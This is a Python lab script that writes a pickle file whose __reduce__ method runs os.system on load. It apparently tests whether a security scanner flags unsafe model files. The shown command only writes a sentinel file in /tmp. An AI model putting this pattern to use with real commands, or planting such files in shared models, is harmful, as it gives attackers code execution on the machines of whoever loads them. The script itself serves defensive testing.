"""Build a malicious pickle using __reduce__ to execute code on load.

Demonstrates the canonical pickle deserialization attack pattern:
    class Payload:
        def __reduce__(self):
            return (os.system, ("echo pwned",))

When an unsuspecting ML engineer calls pickle.load() or joblib.load() on
this file, Python invokes os.system() with the attacker-controlled argument.
Defender for AI Services flags files containing these opcodes as
"embedded malware / unsafe operators."

This lab payload writes a harmless sentinel file to /tmp so you can verify
exploitation in a sandboxed environment. Never run this against anything
you care about.
"""
from __future__ import annotations

import os
import pickle
from pathlib import Path


class ReducePayload:
    """Calls os.system with a benign sentinel command on unpickle."""

    def __reduce__(self):
        cmd = "touch /tmp/defender-ai-model-security-PWNED && echo 'model load triggered RCE' > /tmp/defender-ai-model-security-PWNED"
        return (os.system, (cmd,))


def main(out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "malicious_reduce.pkl"
    with out_path.open("wb") as f:
        pickle.dump(ReducePayload(), f)
    print(f"Wrote {out_path} ({out_path.stat().st_size} bytes)")
    print("To verify exploitation in a sandbox:")
    print(f"    python -c 'import pickle; pickle.load(open(\"{out_path}\", \"rb\"))'")
    print("    ls -la /tmp/defender-ai-model-security-PWNED")


if __name__ == "__main__":
    main(Path(__file__).resolve().parent / "artifacts")
